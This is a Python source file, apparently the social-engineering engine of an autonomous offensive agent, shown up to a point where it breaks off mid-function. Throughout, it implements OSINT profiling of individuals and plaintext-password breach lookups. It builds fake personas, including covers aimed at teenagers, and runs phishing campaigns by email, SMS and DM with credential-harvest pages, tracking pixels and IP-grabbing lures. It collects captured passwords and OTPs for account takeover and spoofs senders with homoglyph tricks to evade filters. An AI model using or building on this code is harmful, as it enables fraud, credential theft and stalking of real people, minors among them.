"""
engine.py — social engineering engine for the autonomous agent.

Wraps the low-level social modules (persona, mailers, grabbit, templates)
behind one injectable interface so the agent can run OSINT persona
discovery, breach checks, phishing/sms delivery and full campaigns as
capabilities, and so tests can swap in a deterministic fake.

Every operation returns (ok, output_lines) where output uses stable markers
the interpreters parse:

    IDENTITY: username=<u> platform=<p> url=<url>          (osint hits)
    IDENTITY: phone=<e164> carrier=<name> region=<r>       (phone osint)
    BREACH: email=<e> password=<p> source=<s>              (breach dump)
    BREACH_EXPOSURE: email=<e> breach=<name> date=<d>      (breach, no pw)
    PERSONA: email=<e> mailbox=<id>                        (temp mailbox)
    PHISH_SENT: to=<t> channel=<email|sms> link=<url>      (delivery ok)
    CAMPAIGN: id=<c> pretext=<p> to=<t> status=<s> link=<url>
    OPEN: to=<t> ip=<ip>                                   (pixel loaded)
    CREDS: email=<e> username=<u> password=<p> otp=<o>     (harvested)
    VICTIM_IP: ip=<ip> ua=<ua> when=<ts>                   (grabbit hit)
    ERROR: <message>                                       (soft failure)
"""

from __future__ import annotations

import os
import time
import uuid
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from phantom.automation.social.templates import (
    build_context,
    build_html_body,
    default_pretext,
    pretext_ids,
    render_pretext,
)


# lazy-loaded (dossier imports stay light)
def _load_dossier():
    from phantom.automation.social.dossier import (
        build_dossier,
        dossier_summary,
        recommend_pretext,
    )
    return build_dossier, dossier_summary, recommend_pretext


def _now() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())


def _marker_error(msg: str) -> str:
    # spaces are significant in marker parsing; replace them so the message
    # is a single opaque value rather than being split into k=v pairs
    return "ERROR: " + msg.replace(" ", "_")


# ---------------------------------------------------------------------------
# profile reverse-engineering (OSINT)
# ---------------------------------------------------------------------------

# profile URL shapes per platform (public, no auth)
_PROFILE_URLS = {
    "instagram": "https://www.instagram.com/{u}/",
    "tiktok": "https://www.tiktok.com/@{u}",
    "x": "https://x.com/{u}",
    "twitter": "https://x.com/{u}",
    "github": "https://github.com/{u}",
    "reddit": "https://www.reddit.com/user/{u}",
    "telegram": "https://t.me/{u}",
    "snapchat": "https://www.snapchat.com/add/{u}",
}

# strings that prove the profile EXISTS and is PRIVATE (per platform)
_PRIVATE_MARKERS = {
    "instagram": ["this account is private", "account is private",
                  "the link you followed may be broken"],
    "tiktok": ["this account is private", "account is private"],
    "x": ["these posts are protected", "posts are protected",
          "this account is private"],
    "reddit": ["this community is private"],
}

# strings that prove the account does NOT exist (per platform)
_NOT_FOUND_MARKERS = {
    "instagram": ["sorry, this page isn't available", "page isn't available"],
    "tiktok": ["couldn't find this account", "can't find this account"],
    "x": ["this account doesn't exist", "account doesn't exist"],
    "github": ["not found"],
    "reddit": ["that's odd", "page not found"],
}


# ---------------------------------------------------------------------------
# campaign state
# ---------------------------------------------------------------------------

@dataclass
class CampaignTarget:
    email: str
    channel: str = "email"            # email | sms
    status: str = "created"           # created, sent, opened, clicked, creds
    link: str = ""
    code: str = ""
    context: Dict[str, str] = field(default_factory=dict)
    events: List[str] = field(default_factory=list)

    def mark(self, status: str, note: str = "") -> bool:
        """Advance status (never regress). Returns True if it changed."""
        order = ["created", "sent", "opened", "clicked", "creds"]
        try:
            cur = order.index(self.status)
            nxt = order.index(status)
        except ValueError:
            return False
        if nxt > cur:
            self.status = status
            if note:
                self.events.append(f"{_now()} {note}")
            return True
        return False


@dataclass
class Campaign:
    id: str
    pretext: str
    targets: List[CampaignTarget] = field(default_factory=list)
    created: str = field(default_factory=_now)

    def target(self, email: str) -> Optional[CampaignTarget]:
        for t in self.targets:
            if t.email == email:
                return t
        return None

    def stats(self) -> Dict[str, int]:
        s: Dict[str, int] = {"sent": 0, "opened": 0, "clicked": 0, "creds": 0}
        for t in self.targets:
            if t.status in ("sent", "opened", "clicked", "creds"):
                s["sent"] += 1
            if t.status in ("opened", "clicked", "creds"):
                s["opened"] += 1
            if t.status in ("clicked", "creds"):
                s["clicked"] += 1
            if t.status == "creds":
                s["creds"] += 1
        return s

    def to_report(self) -> Dict[str, Any]:
        return {
            "id": self.id, "pretext": self.pretext, "created": self.created,
            "stats": self.stats(),
            "targets": [
                {"email": t.email, "channel": t.channel, "status": t.status,
                 "events": t.events} for t in self.targets],
        }


class SocialEngine:
    """Default engine: real modules, graceful no-network degradation."""

    def __init__(self) -> None:
        self._persona = None
        self._persona_inst = None
        self._grabber = None
        self._mailer = None
        self._last_link = None
        self._campaigns: List[Campaign] = []
        self._followup_round = 0  # cycles pretexts for cadence follow-ups
        # identity knowledge accumulated across capabilities so a later
        # phish can target the email/phone that OSINT actually discovered
        # (never the attacker's own disposable mailbox)
        self._discovered: Dict[str, Any] = {
            "emails": [],
            "phones": [],
            "carrier": None,
            "platform": "",
            "company": "",
            "name": "",
            "breaches": [],
            # breach name -> channels seen on (email | phone | username)
            "breach_channels": {},
        }
        # coherent social cover (PersonaProfile) + optional LLM advisor
        self._profile = None
        self._advisor = None
        # run-mode config (set by the agent): aggressive lowers stealth and
        # allows domain-based lures; speed disables the human-wait sleep
        self._aggressive = False
        self._speed = False
        # follow-request ledger (private profiles): handle -> state
        self._follow_requests: Dict[str, Dict[str, Any]] = {}
        self._video_cache: Optional[Dict[str, str]] = None

    def set_social_config(self, aggressive: bool = False,
                          speed: bool = False) -> None:
        """Adopt the run's stealth posture. Aggressive enables domain-based
        credential-harvest lures (louder); speed disables the sleep states
        that wait for the human (fast flag never waits)."""
        self._aggressive = bool(aggressive)
        self._speed = bool(speed)

    # ------------------------------------------------------------------
    # lazy module bindings (imported on use: the social package stays
    # optional until a social capability actually runs)
    # ------------------------------------------------------------------

    def _get_persona(self):
        if self._persona is None:
            from phantom.automation.social.persona import Persona
            self._persona = Persona
        return self._persona

    def _get_grabber(self):
        if self._grabber is None:
            from phantom.automation.social.grabbit import IpGrabber
            self._grabber = IpGrabber()
        return self._grabber

    def _get_mailer(self):
        if self._mailer is None:
            from phantom.automation.social.mailers import Mailer
            self._mailer = Mailer()
        return self._mailer

    # ------------------------------------------------------------------
    # operations — the ONLY place social side effects happen
    # ------------------------------------------------------------------

    def osint(self, target: str, target_type: str) -> Tuple[bool, List[str]]:
        """OSINT discovery on an identity target (username/email/phone).

        * username -> sherlock (public profile URLs)
        * email    -> theHarvester (associated addresses on the domain)
        * phone    -> phonenumbers metadata (carrier, region) — offline
        """
        lines: List[str] = []
        try:
            from phantom.core.executor import execute_quiet
            if target_type == "username":
                res = execute_quiet(
                    f"sherlock --timeout 5 --print-found {target}", timeout=120)
                for line in (res.stdout or "").splitlines():
                    if "]" in line and "://" in line:
                        parts = line.split("]", 1)
                        url = parts[1].strip()
                        platform = parts[0].strip("[").lower()
                        if platform and not self._discovered.get("platform"):
                            self._remember("platform", platform)
                        lines.append(
                            f"IDENTITY: username={target} platform={platform} url={url}")
            elif target_type == "email":
                domain = target.split("@")[-1]
                res = execute_quiet(
                    f"theHarvester -d {domain} -b all -f /dev/null 2>/dev/null",
                    timeout=120)
                for line in (res.stdout or "").splitlines():
                    if "@" in line and "EMAILS" not in line and line.strip():
                        email = line.strip()
                        lines.append(
                            f"IDENTITY: email={email} platform=mail url=https://{domain}")
                        self._remember("emails", email)
            elif target_type == "phone":
                lines = self._osint_phone(target)
            return (True, lines) if lines else (True, [])
        except Exception as e:
            return True, [f"ERROR: osint failed: {e}"]

    def _osint_phone(self, phone: str) -> List[str]:
        try:
            import phonenumbers
            from phonenumbers import carrier as _carrier
            from phonenumbers import geocoder as _geocoder
            parsed = phonenumbers.parse(phone, None)
            e164 = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)
            carrier = _carrier.name_for_number(parsed, "en") or ""
            region = _geocoder.description_for_number(parsed, "en") or ""
            if carrier:
                self._remember("carrier", carrier)
            self._remember("phones", e164)
            return [f"IDENTITY: phone={e164} carrier={carrier} region={region}"]
        except Exception:
            return [f"IDENTITY: phone={phone} carrier= region="]

    def breach(self, target: str, target_type: str) -> Tuple[bool, List[str]]:
        """Breach-dump lookup for an email/username.

        Sources (in order):
          1. PHANTOM_BREACH_API — a self-hosted/aggregator JSON API exposing
             plaintext credentials.
          2. PHANTOM_HIBP_API_KEY — HaveIBeenPwned v3 (breachedaccount).
             Returns exposure facts (which breaches) but never passwords.
        """
        lines: List[str] = []
        api = os.getenv("PHANTOM_BREACH_API", "")
        hibp_key = os.getenv("PHANTOM_HIBP_API_KEY", "")
        if not api and not hibp_key:
            return True, [_marker_error(
                "no breach source configured: set PHANTOM_BREACH_API or PHANTOM_HIBP_API_KEY")]

        if api:
            # the channel the breach was found on matters: the same breach
            # name on email AND phone is the strongest strategic hook
            ch = "phone" if target_type == "phone" else "email"
            try:
                from phantom.core.executor import execute_quiet
                res = execute_quiet(
                    f"curl -s -m 20 -H 'Accept: application/json' "
                    f"'{api}/lookup?q={target}'", timeout=30)
                out = (res.stdout or "").strip()
                if out.startswith("{"):
                    import json
                    data = json.loads(out)
                    for entry in data.get("results", []):
                        email = entry.get("email", target)
                        self._remember("emails", email)
                        pw = entry.get("password", "")
                        self._remember_breach(entry.get("source", "breach"), ch)
                        if pw:
                            lines.append(
                                f"BREACH: email={email} "
                                f"password={pw} source={entry.get('source', 'breach')}")
            except Exception as e:
                lines.append(_marker_error(f"breach API failed: {e}"))

        if hibp_key and target_type in ("email", "username"):
            try:
                from phantom.core.executor import execute_quiet
                account = target if target_type == "email" else target
                res = execute_quiet(
                    f"curl -s -m 20 -H 'hibp-api-key: {hibp_key}' "
                    f"-H 'User-Agent: Phantom' "
                    f"'https://haveibeenpwned.com/api/v3/breachedaccount/"
                    f"{account}?truncateResponse=false'", timeout=30)
                out = (res.stdout or "").strip()
                if out.startswith("["):
                    import json
                    for br in json.loads(out):
                        name = br.get("Name", "?")
                        date = br.get("BreachDate", "")
                        self._remember_breach(name, "email")
                        lines.append(
                            f"BREACH_EXPOSURE: email={target} breach={name} date={date}")
                elif res.returncode == 404:
                    pass  # no breaches on record — legitimately clean
            except Exception as e:
                lines.append(_marker_error(f"HIBP lookup failed: {e}"))

        return (True, lines) if lines else (True, [])

    def persona(self) -> Tuple[bool, List[str]]:
        """Create a disposable persona with a temp mailbox."""
        try:
            persona = self._get_persona().generate()
            self._persona_inst = persona
            return True, [f"PERSONA: email={persona.email} mailbox={persona.email_id}"]
        except Exception as e:
            return False, [f"ERROR: persona creation failed: {e}"]

    def persona_profile(self, seed: Optional[int] = None, name: str = "",
                        locale: str = "en",
                        audience: str = "") -> Tuple[bool, List[str]]:
        """Create a coherent social cover: name/age/job/city/interests/bio
        plus an avatar picture — the profile a target sees before opening
        a DM, so the identity is believable with ZERO extra configuration.

        `audience` (middle | high | university | professional) adapts the
        cover to the target's world — a 15-year-old does not believe a
        "Senior Developer". When empty, it is inferred from the discovered
        platform (instagram/tiktok/snapchat -> student, else professional).
        """
        try:
            from phantom.automation.social.persona import (
                generate_avatar,
                generate_profile,
            )
            profile = generate_profile(seed=seed, locale=locale,
                                       name=name or None,
                                       audience=audience or self._infer_audience())
            profile.avatar_path = generate_avatar(profile)
            self._profile = profile
            # marker values are single tokens: spaces become underscores
            def _tok(v: str) -> str:
                return (v or "").replace(" ", "_")
            return True, [
                f"PERSONA_PROFILE: name={_tok(profile.name)} "
                f"age={profile.age} job={_tok(profile.job_title)} "
                f"location={_tok(profile.city)} "
                f"avatar={profile.avatar_path or ''}",
            ]
        except Exception as e:
            return False, [f"ERROR: persona profile failed: {e}"]

    def dossier(self) -> Tuple[bool, List[str]]:
        """Build the strategic dossier from everything discovered so far:
        breach correlation across email/phone + recommended pretext.
        """
        try:
            build_dossier, dossier_summary, _ = _load_dossier()
            d = build_dossier(self._discovered)
            s = dossier_summary(d)
            # marker values are single tokens: spaces become underscores
            def _tok(v: str) -> str:
                return (v or "-").replace(" ", "_")
            hook = d.hook.replace(" ", "_")
            lines = [
                f"DOSSIER: name={_tok(d.name)} platform={_tok(d.platform)} "
                f"company={_tok(d.company)} breaches={s['breach_count']} "
                f"cross_channel={int(s['cross_channel_breach'])}",
                f"DOSSIER_RECOMMEND: pretext={d.recommended} "
                f"score={round(d.recommendation_score, 2)}",
            ]
            if hook:
                lines.append(f"DOSSIER_HOOK: {hook}")
            return True, lines
        except Exception as e:
            return False, [f"ERROR: dossier build failed: {e}"]

    def profile_recon(self, username: str,
                      platform: str = "") -> Tuple[bool, List[str]]:
        """Reverse-engineering of a target's social profile (OSINT only).

        A private profile cannot be scraped — it is MAPPED:
          * fetch the profile page and decide private / public / missing
          * extract the bio, the link in bio, any @handles and emails
          * run sherlock on the username to find the same person on OTHER
            platforms (including public accounts of the same handle)
        Every new handle / email becomes an identity lead the planner can
        pivot on, and the profile state feeds the strategic dossier.
        """
        lines: List[str] = []
        try:
            import re as _re
            from phantom.core.executor import execute_quiet
            username = (username or "").strip().lstrip("@")
            if not username:
                return False, [_marker_error("profile_recon needs a username")]
            platform = (platform or self._discovered.get("platform") or "").lower()
            urls = self._profile_candidates(platform, username)
            best_private = None
            for p, url in urls:
                res = execute_quiet(
                    f"curl -s -L -m 15 -A 'Mozilla/5.0 (Windows NT 10.0; "
                    f"Win64; x64) Chrome/125.0 Safari/537.36' '{url}'",
                    timeout=25)
                html = (res.stdout or "")[:200000]
                low = html.lower()
                if any(m in low for m in _NOT_FOUND_MARKERS.get(p, [])):
                    continue  # no account on this platform
                private = any(m in low for m in _PRIVATE_MARKERS.get(p, []))
                bio = self._extract_bio(html, p)
                link = self._extract_link(bio)
                handles = self._extract_handles(bio)
                emails = self._extract_emails(f"{html} {bio}")
                if not private and not bio and not link:
                    continue  # page was served but nothing usable
                self._remember("platform", p)
                for e in emails:
                    self._remember("emails", e)
                if best_private is None or private:
                    best_private = private
                self._discovered["profile"] = {
                    "username": username, "platform": p,
                    "private": private, "bio": bio, "link": link,
                    "handles": handles, "emails": emails,
                }
                def _tok(v: str) -> str:
                    return (v or "").replace(" ", "_")
                lines.append(
                    f"PROFILE: username={username} platform={p} "
                    f"private={int(private)} bio={_tok(bio)} link={link}")
                for h in handles:
                    lines.append(
                        f"ACCOUNT_LINK: handle={h} source={p} "
                        f"url=https://{p}.com/{h}")
                if not private and handles:
                    lines.extend(self._sherlock_handles(username, handles))
                break  # one solid profile is enough for this pass
            return (True, lines) if lines else (True, [])
        except Exception as e:
            return False, [f"ERROR: profile recon failed: {e}"]

    def _profile_candidates(self, platform: str, username: str) -> List[tuple]:
        """Ordered list of (platform, url) to try. Known platform first, then
        the most common public-profile platforms."""
        known = [platform] if platform in _PROFILE_URLS else []
        rest = [p for p in ("instagram", "tiktok", "x", "github", "reddit",
                            "telegram") if p not in known]
        return [(p, _PROFILE_URLS[p].format(u=username)) for p in known + rest]

    def _sherlock_handles(self, username: str, handles: List[str]) -> List[str]:
        """sherlock the discovered handles to find the SAME person's other
        public accounts. Best-effort: never raises."""
        lines: List[str] = []
        try:
            from phantom.core.executor import execute_quiet
            for h in handles[:3]:
                res = execute_quiet(
                    f"sherlock --timeout 5 --print-found {h}", timeout=60)
                for line in (res.stdout or "").splitlines():
                    if "]" in line and "://" in line:
                        parts = line.split("]", 1)
                        url = parts[1].strip()
                        plat = parts[0].strip("[").lower()
                        lines.append(
                            f"ACCOUNT_LINK: handle={h} platform={plat} url={url}")
        except Exception:
            pass
        return lines

    @staticmethod
    def _extract_bio(html: str, platform: str) -> str:
        """Bio text from meta description/og tags (dependency-free)."""
        import re as _re
        for pat in (r'name="description" content="([^"]{0,500})"',
                    r'property="og:description" content="([^"]{0,500})"',
                    r'<meta name="description" content="([^"]{0,500})"\s*/?>'):
            m = _re.search(pat, html, _re.I)
            if m:
                return m.group(1).strip()
        return ""

    @staticmethod
    def _extract_link(text: str) -> str:
        """URL from free text: scheme optional (bio links are often written
        bare like linktr.ee/x); emails are excluded via the @ lookbehind."""
        import re as _re
        m = _re.search(
            r"(?<![\w@.])(?:https?://)?(?:www\\.)?"
            r"[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+(?:/[^\s\"'<>]*)?",
            text or "")
        if not m:
            return ""
        url = m.group(0)
        if not url.startswith("http"):
            url = "https://" + url
        return url

    @staticmethod
    def _extract_handles(text: str) -> List[str]:
        import re as _re
        found = []
        for m in _re.finditer(r"@([A-Za-z0-9][A-Za-z0-9_.]{1,29})", text or ""):
            h = m.group(1)
            if h.lower() not in ("followers", "following", "posts", "verified"):
                if h not in found:
                    found.append(h)
        return found[:5]

    @staticmethod
    def _extract_emails(text: str) -> List[str]:
        import re as _re
        return list(dict.fromkeys(
            _re.findall(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}",
                        text or "")))[:5]

    # ------------------------------------------------------------------
    # single phish (backwards-compatible with the phish_identity cap)
    # ------------------------------------------------------------------

    def phish(self, target: str, target_type: str,
              subject: str = "", body: str = "",
              pretext: Optional[str] = None,
              use_login_page: bool = False,
              strategic: bool = False,
              use_video: bool = False) -> Tuple[bool, List[str]]:
        """Deliver one phish.

        With `pretext` set, the body/subject are rendered from the pretext
        library using the OSINT context (name/platform/breach), the email is
        HTML with an open-tracking pixel and the link points at a
        credential-harvest page when `use_login_page` is True. Without a
        pretext the legacy static template is used (backwards compatible).

        `strategic=True` enables strategic phishing: the pretext is picked
        by the dossier scorer (or the LLM advisor when configured), the
        body carries a recognition hook from the breach correlation, and a
        subject twist personalizes the headline. `use_video=True` swaps the
        link for a reel/short lure that captures the IP on page load.
        """
        lines: List[str] = []
        try:
            grabber = self._get_grabber()
            if use_video:
                video = self._pick_lure_video()
                link = grabber.create_video_share_link(
                    label="phish", platform=self._lure_platform(),
                    handle=self._discovered_handle(), video=video)
            elif use_login_page:
                link = grabber.create_login_link(label="phish")
            else:
                link = grabber.create_link(label="phish")
            self._last_link = link

            if strategic and pretext is None:
                pretext = self._strategic_pretext()

            if target_type == "phone":
                return self._phish_sms(target, link, subject=subject, body=body)
            recipient = self._target_email(target, target_type)
            if not recipient:
                return False, [_marker_error(
                    "no email discovered for username target: run OSINT/breach first")]

            mailer = self._get_mailer()
            rendered = self._render_for(recipient, pretext, subject, body, link,
                                        pixel=True, strategic=strategic)
            ok = mailer.send_email(
                rendered["from"], recipient, rendered["subject"],
                rendered["body_text"], html=rendered["body_html"],
                reply_to=self._reply_to())
            if not ok:
                return False, [_marker_error(
                    "email delivery failed: configure PHANTOM_SMTP_USER/PHANTOM_SMTP_PASSWORD")]
            lines.append(
                f"PHISH_SENT: to={recipient} channel=email link={link.short_url}")
            return True, lines
        except Exception as e:
            return False, [f"ERROR: phish delivery failed: {e}"]

    # ------------------------------------------------------------------
    # campaign engine
    # ------------------------------------------------------------------

    def campaign(self, targets: List[str],
                 pretext: Optional[str] = None,
                 use_login_page: bool = True,
                 subject: str = "", body: str = "",
                 strategic: bool = False,
                 use_video: bool = False) -> Tuple[bool, List[str]]:
        """Run a full phishing campaign against a list of emails/phones.

        Each target gets a personalized lure (pretext + OSINT context),
        an open-tracking pixel and a per-target link; per-target status
        (sent -> opened -> clicked -> creds) is tracked for reporting.

        `strategic=True` auto-selects the pretext from the dossier and
        personalizes every lure with the breach-correlation hook and a
        subject twist. `use_video=True` turns each link into a reel/short
        lure that captures the victim's IP on page load.
        """
        if strategic and pretext is None:
            pretext = self._strategic_pretext()
        pretext = pretext or default_pretext()
        if not targets:
            return False, [_marker_error("campaign requires at least one target")]
        if pretext not in pretext_ids():
            return False, [_marker_error(
                f"unknown pretext '{pretext}': use one of {','.join(pretext_ids())}")]
        camp = Campaign(id=uuid.uuid4().hex[:8], pretext=pretext)
        lines: List[str] = []
        grabber = self._get_grabber()
        mailer = self._get_mailer()

        for t in targets:
            t = (t or "").strip()
            if not t:
                continue
            is_phone = t.lstrip("+").isdigit()
            ct = CampaignTarget(email=t, channel="sms" if is_phone else "email")
            try:
                if is_phone:
                    link = (grabber.create_video_link(label="camp")
                            if use_video else grabber.create_link(label="camp"))
                    ct.link, ct.code = link.short_url, link.code
                    ok, out = self._phish_sms(t, link, subject=subject, body=body)
                else:
                    if use_video:
                        video = self._pick_lure_video()
                        link = grabber.create_video_share_link(
                            label="camp", platform=self._lure_platform(),
                            handle=self._discovered_handle(), video=video)
                    elif use_login_page:
                        link = grabber.create_login_link(label="camp")
                    else:
                        link = grabber.create_link(label="camp")
                    ct.link, ct.code = link.short_url, link.code
                    rendered = self._render_for(t, pretext, subject, body, link,
                                                pixel=True, strategic=strategic)
                    ok = mailer.send_email(
                        rendered["from"], t, rendered["subject"],
                        rendered["body_text"], html=rendered["body_html"],
                        reply_to=self._reply_to())
                    out = []
                if ok:
                    ct.mark("sent")
                    lines.append(
                        f"CAMPAIGN: id={camp.id} pretext={pretext} to={t} "
                        f"status=sent link={link.short_url}")
                else:
                    lines.append(_marker_error(
                        f"delivery failed for {t}: configure SMTP"))
            except Exception as e:
                lines.append(_marker_error(f"campaign target {t}: {e}"))
            camp.targets.append(ct)

        self._campaigns.append(camp)
        self._last_link = camp.targets[0].link if camp.targets else None
        return (True, lines) if lines else (False, [_marker_error("no targets processed")])

    def follow_up(self, targets: List[str],
                  use_video: bool = True,
                  use_login_page: bool = False) -> Tuple[bool, List[str]]:
        """Cadence / re-engagement: send a SECOND-CHANCE lure to targets
        that never interacted with the first campaign.

        The follow-up is a fresh campaign from the same persona with a
        DIFFERENT pretext (cycled so we never repeat the last few angles),
        a new tracking link and a new open-pixel — professional outreach
        cadence: a second touch after a grace period, never spam. All the
        tracking (open / click / creds) keeps working because the new
        campaign is polled by the same `harvest` loop.
        """
        ids = [p for p in pretext_ids()]
        used = {c.pretext for c in self._campaigns[-3:]} or set()
        pool = [p for p in ids if p not in used] or ids or [default_pretext()]
        pretext = pool[self._followup_round % len(pool)]
        self._followup_round += 1
        ok, lines = self.campaign(
            targets=targets, pretext=pretext,
            use_login_page=use_login_page, use_video=use_video,
            subject="Re: your recent request",
            body="Just following up in case you missed my earlier note.")
        return ok, lines

    def harvest(self, timeout: float = 15.0) -> Tuple[bool, List[str]]:
        """Poll every active campaign for opens / clicks / credentials.

        Returns new events as markers. A captured credential becomes
        `CREDS:` — the interpreter turns it into a valid creds finding so
        the planner can pivot straight to service login with it.
        """
        lines: List[str] = []
        grabber = self._get_grabber()
        from phantom.automation.social.grabbit import GrabLink
        for camp in self._campaigns:
            for ct in camp.targets:
                if not ct.code:
                    continue
                link = GrabLink(short_url=ct.link, code=ct.code)
                if ct.status in ("created", "sent", "opened"):
                    try:
                        opens = grabber.poll_opens(link, timeout=min(timeout, 8))
                        if opens and ct.mark("opened"):
                            lines.append(f"OPEN: to={ct.email} ip={opens[0].ip}")
                    except Exception:
                        pass
                if ct.status in ("created", "sent", "opened", "clicked"):
                    try:
                        hits = grabber.poll_hits(link, timeout=min(timeout, 8))
                        if hits and ct.mark("clicked"):
                            h = hits[0]
                            lines.append(
                                f"VICTIM_IP: ip={h.ip} ua={h.user_agent} when={_now()}")
                    except Exception:
                        pass
                if ct.status == "clicked":
                    try:
                        creds = grabber.poll_creds(link, timeout=min(timeout, 8))
                        if creds and ct.mark("creds"):
                            c = creds[0]
                            lines.append(
                                f"CREDS: email={ct.email} username={c.username} "
                                f"password={c.password} otp={c.otp}")
                            if c.username and c.password:
                                self._remember("emails", c.username)
                    except Exception:
                        pass
        return (True, lines) if lines else (True, [])

    def dm(self, targets: List[str],
            pretext: Optional[str] = None,
            platform: str = "auto",
            use_login_page: bool = True,
            use_video: bool = False) -> Tuple[bool, List[str]]:
        """Send short direct messages (Telegram/Discord/console) with a
        per-target tracking link.

        A DM click still lands on the grabbit tracker, so the identity
        chain converges on a victim_ip exactly like the email path.
        Requires PHANTOM_TELEGRAM_BOT_TOKEN or PHANTOM_DISCORD_WEBHOOK;
        degrades to a clear ERROR marker when neither is configured.
        """
        from phantom.automation.social.social_dm import (
            dm_pretext_ids, get_dm_transport, launch_dm)
        pretext = pretext or "security_verify"
        if not targets:
            return False, ["ERROR: dm requires at least one target"]
        if pretext not in dm_pretext_ids():
            return False, [
                f"ERROR: unknown_dm_pretext_{pretext}: use one of "
                f"{','.join(dm_pretext_ids())}"]
        transport = get_dm_transport(platform)
        if transport is None:
            return False, ["ERROR: no_dm_transport_configured: "
                           "set PHANTOM_TELEGRAM_BOT_TOKEN or "
                           "PHANTOM_DISCORD_WEBHOOK"]
        grabber = self._get_grabber()
        lines: List[str] = []
        for t in targets:
            t = (t or "").strip()
            if not t:
                continue
            if use_video:
                video = self._pick_lure_video()
                link = grabber.create_video_share_link(
                    label="dm", platform=self._lure_platform(),
                    handle=self._discovered_handle(), video=video)
            elif use_login_page:
                link = grabber.create_login_link(label="dm")
            else:
                link = grabber.create_link(label="dm")
            ctx = {"name": self._discovered_name(t),
                   "platform": self._discovered.get("platform") or "online"}
            ok, out = launch_dm([t], pretext, link=str(link.short_url),
                                transport=transport, context=ctx)
            lines.extend(out)
        return (True, lines) if lines else (False, ["ERROR: no targets processed"])

    def dm_delivered(self, lines: List[str]) -> bool:
        """True when at least one DM_SENT marker reports delivered=1."""
        from phantom.automation.social.social_dm import dm_delivery_report
        return dm_delivery_report(lines).get("delivered", 0) > 0

    def dm_follow(self, handles: List[str],
                  platform: str = "") -> Tuple[bool, List[str]]:
        """Send a FOLLOW REQUEST to a private account before the DM.

        A private profile cannot be DM'd until the target accepts the
        follow: this records the request and, when the transport supports
        it, actually sends it. The follow is then awaited via
        `wait_follow` (the agent's sleep state) before `dm_launch` runs.
        Platforms without OAuth (Instagram/TikTok/X) report the transport
        limitation honestly instead of pretending.
        """
        from phantom.automation.social.social_dm import get_dm_transport
        platform = (platform or self._discovered.get("platform") or "").lower()
        transport = get_dm_transport(platform)
        lines: List[str] = []
        for h in handles:
            h = (h or "").strip().lstrip("@")
            if not h:
                continue
            delivered, note = 0, "ok"
            if transport is not None and hasattr(transport, "send_follow"):
                try:
                    delivered = 1 if transport.send_follow(h) else 0
                    if not delivered:
                        note = "follow_not_sent"
                except Exception as e:
                    note = str(e)[:80].replace(" ", "_")
            elif transport is None and platform in ("instagram", "tiktok", "x"):
                note = "platform_follow_requires_oauth"
            self._follow_requests[h] = {"platform": platform,
                                        "sent_at": _now(),
                                        "accepted": False}
            lines.append(f"FOLLOW_SENT: handle={h} platform={platform} "
                         f"delivered={delivered} note={note}")
        return (True, lines) if lines else (False, ["ERROR: no_follow_targets"])

    def accept_follow(self, handle: str) -> bool:
        """Mark a follow request as accepted (operator confirm / test / an
        OAuth-backed transport detecting the accept)."""
        req = self._follow_requests.get(handle)
        if req is None:
            return False
        req["accepted"] = True
        return True

    def wait_follow(self, timeout: float = 300.0) -> Tuple[bool, List[str]]:
        """Block (chunked) until every pending follow request is accepted.
        Returns FOLLOW_ACCEPTED markers for the ones accepted; no markers
        when the horizon is exhausted (the agent escalates, never hangs)."""
        deadline = time.time() + timeout
        lines: List[str] = []
        while time.time() < deadline:
            pending = [h for h, r in self._follow_requests.items()
                       if not r.get("accepted")]
            if not pending:
                break
            time.sleep(2.0)
        for h, r in self._follow_requests.items():
            if r.get("accepted"):
                lines.append(f"FOLLOW_ACCEPTED: handle={h} "
                             f"platform={r.get('platform', '')}")
        return (bool(lines), lines)

    def _discovered_name(self, target: str) -> str:
        """Best-effort display name for a DM handle from OSINT memory."""
        emails = self._discovered.get("emails") or []
        if emails:
            local = emails[0].split("@")[0]
            parts = [p for p in local.replace(".", " ").replace("_", " ")
                     .split() if p]
            if parts:
                return " ".join(p.capitalize() for p in parts[:2])
        return "there"

    def campaigns(self) -> List[Dict[str, Any]]:
        return [c.to_report() for c in self._campaigns]

    # ------------------------------------------------------------------
    # helpers
    # ------------------------------------------------------------------

    def _target_email(self, target: str, target_type: str) -> str:
        if target_type == "email":
            return target
        # username: target the email OSINT discovered, not the attacker's
        # own temp mailbox (the self-phish bug)
        emails = self._discovered.get("emails") or []
        return emails[0] if emails else ""

    def _render_for(self, email: str, pretext: Optional[str], subject: str,
                    body: str, link, pixel: bool = False,
                    strategic: bool = False) -> Dict[str, str]:
        """Build {from, subject, body_text, body_html} for one recipient.

        With `strategic=True` the lure is refined from the target dossier:
        a recognition hook (breach correlation / phone tail) is added to
        the body and the LLM advisor (when configured) may swap the pretext
        and add a subject twist — every suggestion is sanitized.
        """
        platform = self._discovered.get("platform") or ""
        breaches = list(self._discovered.get("breaches") or [])
        hook, twist = "", ""
        if strategic:
            build_dossier, _, _ = _load_dossier()
            d = build_dossier(self._discovered)
            hook = d.hook
            advisor = self._get_advisor()
            if advisor is not None:
                sug = advisor.analyze_dossier(d.to_dict())
                # the LLM may only refine the HOOK and SUBJECT — the pretext
                # is decided once, before the lure is built (deterministic
                # scorer, with advisor preference when configured)
                hook = sug.get("hook") or hook
                twist = sug.get("subject_twist") or ""
        ctx = build_context(email=email, platform=platform, breaches=breaches,
                            hook=hook)
        if pretext:
            rendered = render_pretext(pretext, ctx, link=link.short_url)
            subj = rendered["subject"]
            body_text = rendered["body_text"]
            sender_name = rendered["sender"]
        else:
            subj = subject or "Your account activity report"
            body_text = body or (
                "Dear user,\n\nWe noticed unusual activity on your "
                f"account. Verify your recent sessions here: {link.short_url}\n\n"
                "Regards,\nIT Security Team")
            sender_name = "IT Security Team"
        if twist and twist not in subj:
            subj = f"{subj} - {twist}"  # ASCII: em-dash breaks cp1252 consoles
        # From hardening: the sender identity is derived from the dossier —
        # a SERVICE the target uses (platform brand + domain) or a PERSON
        # they know (a colleague at the corporate domain when OSINT found
        # one) — then the display name and subject are obfuscated with
        # Cyrillic homoglyphs so naive text filters stop matching the
        # canonical keywords (human-invisible, IDN-homograph style).
        from phantom.automation.social.spoof import apply, derive_sender
        build_dossier, _, _ = _load_dossier()
        dossier = build_dossier(self._discovered).to_dict()
